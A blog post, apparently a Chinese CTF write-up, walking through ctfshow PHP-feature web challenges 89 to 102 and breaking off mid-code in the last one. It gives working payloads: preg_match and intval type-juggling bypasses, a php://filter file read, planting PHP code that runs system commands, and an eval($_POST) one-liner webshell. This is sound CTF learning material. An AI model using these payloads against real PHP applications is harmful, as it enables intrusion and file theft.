@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>ctfshow php特性 | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"kinsey973.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="web-php特性url传入的数值都默认为字符串 web-89重点在于绕过preg_match函数，且num是个int类型的数字 我们可以通过数组进行绕过，就得到了flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow php特性">
+<meta property="og:url" content="https://kinsey973.github.io/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="北歌">
+<meta property="og:description" content="web-php特性url传入的数值都默认为字符串 web-89重点在于绕过preg_match函数，且num是个int类型的数字 我们可以通过数组进行绕过，就得到了flag">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091536900.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091542431.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091602933.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091608812.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091614175.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092134708.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092139703.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092140263.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092146409.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092152768.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092156711.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404101923040.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404102047602.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111934695.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111935095.png">
+<meta property="article:published_time" content="2024-10-08T12:08:38.000Z">
+<meta property="article:modified_time" content="2024-10-08T12:11:08.116Z">
+<meta property="article:author" content="kinsey">
+<meta property="article:tag" content="php特性">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">124</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-php%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">web-php特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-89"><span class="toc-number">2.</span> <span class="toc-text">web-89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-90"><span class="toc-number">3.</span> <span class="toc-text">web-90</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-91"><span class="toc-number">4.</span> <span class="toc-text">web-91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-92"><span class="toc-number">5.</span> <span class="toc-text">web-92</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-93"><span class="toc-number">6.</span> <span class="toc-text">web-93</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-94"><span class="toc-number">7.</span> <span class="toc-text">web-94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-95"><span class="toc-number">8.</span> <span class="toc-text">web-95</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-96"><span class="toc-number">9.</span> <span class="toc-text">web-96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-97"><span class="toc-number">10.</span> <span class="toc-text">web-97</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-98"><span class="toc-number">11.</span> <span class="toc-text">web-98</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-99"><span class="toc-number">12.</span> <span class="toc-text">web-99</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-100"><span class="toc-number">13.</span> <span class="toc-text">web-100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-101"><span class="toc-number">14.</span> <span class="toc-text">web-101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-102"><span class="toc-number">15.</span> <span class="toc-text">web-102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-103"><span class="toc-number">16.</span> <span class="toc-text">web-103</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-104"><span class="toc-number">17.</span> <span class="toc-text">web-104</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinsey973.github.io/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ctfshow php特性<a class="post-edit-link" href="https://github.com/kinsey973/kinsey973.github.io/tree/master/2024/05/31/hello-world_posts/ctfshow-php特性.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-10-08 20:08:38" itemprop="dateCreated datePublished" datetime="2024-10-08T20:08:38+08:00">2024-10-08</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">1.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">6m</span></span></span><span class="leancloud_visitors" id="/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/" data-flag-title="ctfshow php特性"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/php%E7%89%B9%E6%80%A7/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">php特性</span></a><a class="tag-item" href="/tags/ctfshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctfshow</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="web-php特性"><a href="#web-php特性" class="headerlink" title="web-php特性"></a>web-php特性</h3><p><strong>url传入的数值都默认为字符串</strong></p>
+<h3 id="web-89"><a href="#web-89" class="headerlink" title="web-89"></a>web-89</h3><p>重点在于绕过preg_match函数，且num是个int类型的数字</p>
+<p>我们可以通过数组进行绕过，就得到了flag</p>
+<span id="more"></span>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png" alt="image-20240409152647713" loading="lazy"></p>
+<hr>
+<h3 id="web-90"><a href="#web-90" class="headerlink" title="web-90"></a>web-90</h3><p>这题考察intval()函数和强比较</p>
+<p><strong>强比较</strong></p>
+<p>在php中，三个等号“&#x3D;&#x3D;&#x3D;”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p>
+<p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。</p>
+<p>这题传入num&#x3D;4476a，原因是如果base&#x3D;0时，当intval遇到字母，会自动停止</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091536900.png" alt="image-20240409153622847" loading="lazy"></p>
+<hr>
+<h3 id="web-91"><a href="#web-91" class="headerlink" title="web-91"></a>web-91</h3><p>考察preg_match()和正则表达式</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091542431.png" alt="image-20240409154242409" loading="lazy"></p>
+<p>第一层由于&#x2F;m存在为多行匹配，第二层为单行匹配，要想通过第一层且绕过第二层，我们使用换行绕过</p>
+<p>传入<strong>cmd&#x3D;%0Aphp</strong>就可以了，**%0A为换行符的url编码**</p>
+<p>这样传入的数就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">		//第一行为空格</span><br><span class="line">php		//第二行为php</span><br></pre></td></tr></table></figure>
+
+<p>就能拿到flag了</p>
+<hr>
+<h3 id="web-92"><a href="#web-92" class="headerlink" title="web-92"></a>web-92</h3><p>这道题考察的是intval函数和弱类型比较</p>
+<p>但如果我们传入的num为4476a的话，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($num==4476)&#123;</span><br><span class="line">    die(&quot;no no no!&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这层代码就会返回true，因此想要绕过这层代码同时使</p>
+<p>下面这层代码成立，我们可以使用进制转换，intval会自动将字符串转换成指定的进制，且返回int类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(intval($num,0)==4476)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo intval($num,0);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以传入num&#x3D;0x117c来获得flag</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091602933.png" alt="image-20240409160207822" loading="lazy"></p>
+<hr>
+<h3 id="web-93"><a href="#web-93" class="headerlink" title="web-93"></a><strong>web-93</strong></h3><p>这题和上题一样，但限制了字母，因此二进制，十六进制就不可以用了，但八进制没有被过滤掉</p>
+<p>所以传入num&#x3D;010574就能拿到flag了</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091608812.png" alt="image-20240409160816719" loading="lazy"></p>
+<hr>
+<h3 id="web-94"><a href="#web-94" class="headerlink" title="web-94"></a>web-94</h3><p>得了，这道题由于strpos的存在，过滤掉了开头的0（还可以在数据前填个+号，这样0就不是第一位了）</p>
+<p>，但我们发现$num&#x3D;&#x3D;&#x3D;”4476”是个强类型比较，我们就可以传入num&#x3D;4476.0，因为url传入的默认是字符串，所以这个强类型比较返回false，然后就能一路拿到flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br><span class="line">?num=4476.0</span><br><span class="line">?num=+010574</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091614175.png" alt="image-20240409161434098" loading="lazy"></p>
+<hr>
+<h3 id="web-95"><a href="#web-95" class="headerlink" title="web-95"></a>web-95</h3><p>把点过滤了，不过还是能在前面加空格、换行或者加减号.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br><span class="line">?num=%<span class="number">0</span>a010574</span><br><span class="line">?num=+<span class="number">010574</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092134708.png" alt="image-20240409213427619" loading="lazy"></p>
+<hr>
+<h3 id="web-96"><a href="#web-96" class="headerlink" title="web-96"></a>web-96</h3><p>可以用php伪协议来做</p>
+<p>传入?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092139703.png" alt="image-20240409213931618" loading="lazy"></p>
+<p>会得到一串base64编码，再通过解码就能得到flag</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092140263.png" alt="image-20240409214016225" loading="lazy"></p>
+<p>其它payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./flag.php                            相对路径</span><br><span class="line">/var/www/html/flag.php                绝对路径</span><br><span class="line">php://filter/resource=flag.php        php伪协议 </span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-97"><a href="#web-97" class="headerlink" title="web-97"></a>web-97</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092146409.png" alt="image-20240409214614357" loading="lazy"></p>
+<p>利用md5不能识别数组，且返回false来绕过md5得到flag</p>
+<hr>
+<h3 id="web-98"><a href="#web-98" class="headerlink" title="web-98"></a>web-98</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092152768.png" alt="image-20240409215230746" loading="lazy"></p>
+<p>解释一下$_GET?$_GET&#x3D;&amp;$_POST:’flag’;</p>
+<p>如果get传入了一个值，就要用post传入的值覆盖掉,否则get传不进去</p>
+<p>highlight_file($<em>GET[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’?$flag:_<em>FILE</em></em>);</p>
+<p>如果HTTP_FLAG通过get方式传入一个flag，就打开flag这个文件</p>
+<p>所以POST：HTTP_FLAG&#x3D;flag；GET随便传什么都行.</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092156711.png" alt="image-20240409215642596" loading="lazy"></p>
+<hr>
+<h3 id="web-99"><a href="#web-99" class="headerlink" title="web-99"></a>web-99</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();                //设置为数组</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));        //向数组里面插入随机数</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>函数in_array()第三个参数</p>
+<p>is_array()可以判断一个值是否在数组中。</p>
+<p>in_array(value,array,type) value ：要搜索的值</p>
+<p>array ： 被搜索的数组</p>
+<p>type ： 类型，true全等 ，false非全等（默认）</p>
+<p>file_put_contents() 函数把一个字符串写入文件中。f</p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</span><br><span class="line">filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。 data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。</span><br></pre></td></tr></table></figure>
+
+<p>GET传入n&#x3D;1.php</p>
+<p>这题file_put_contents() 函数没有设置第三个参数，所以1.php和数字1比较时，1.php会转化为1再和1比较， 满足条件.</p>
+<p>接着POST：content&#x3D;<?php system("ls");?> 传入php代码到1.php中，然后访问1.php发现flag</p>
+<p>查看flag，POST：content&#x3D;<?php system("tac flag36d.php");?></p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404101923040.png" alt="image-20240410192315875" loading="lazy"></p>
+<h3 id="web-100"><a href="#web-100" class="headerlink" title="web-100"></a>web-100</h3><p>这题考察运算符的优先级</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>
+
+<p>由于&#x3D;的优先级大于and，因此只要满足v1是个数字，v0就返回1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计，v2不能存在；，而v3要存在一个；且在开头</p>
+<p>我们可以用highlight_file()返回ctfshow.php中的内容</p>
+<p>?v1&#x3D;1&amp;v2&#x3D;highlight_file(“ctfshow.php”)&amp;v3&#x3D;;</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404102047602.png" alt="image-20240410204709521" loading="lazy"></p>
+<p>我们得到flag为a2eae7f30x2d8dc90x2d45560x2dad910x2d629eccb9bba4，接下来把0x2d换成-就能得到flag了</p>
+<p>也可以传入?v1&#x3D;1&amp;v2&#x3D;eval($_POST[1])?%3E&amp;v3&#x3D;; 传入一句话木马，然后使用蚁剑进行连接</p>
+<hr>
+<h3 id="web-101"><a href="#web-101" class="headerlink" title="web-101"></a>web-101</h3><p>这题考察反射和运算符的优先级</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>
+
+<p>根据上题的经验，我们可以知道v1&#x3D;1,</p>
+<p>由于v2,v3过滤了数字和特殊字符</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111934695.png" alt="image-20240411193416613" loading="lazy"></p>
+<p>因此，这题我们考虑用ReflectionClass反射，</p>
+<p>我们传入?v1&#x3D;1&amp;v2&#x3D;echo new RefectionClass&amp;v3&#x3D;;</p>
+<p>我们就能拿到flag值了</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111935095.png" alt="image-20240411193542061" loading="lazy"></p>
+<p>我们把0x2d换成-，得到flag{6feae7fe-d7cd-4fea-9d47-30b0e0ee2be}，但当我们提交flag时，却提示我们flag错误，经过仔细对比，我们发现flag少了一位</p>
+<p>我们可以手动爆破或通过bp，猜flag的最后一位（不演示了）</p>
+<hr>
+<h3 id="web-102"><a href="#web-102" class="headerlink" title="web-102"></a>web-102</h3><p>考察call_user_func函数和php版本特性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;       //为什么用这个，主要是因为编码后带e,或者是编码后全部是数字</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">//输出   5044383959474e6864434171594473</span><br><span class="line">带e会被当做科学计数法，而base64去掉等号，不影响解码</span><br><span 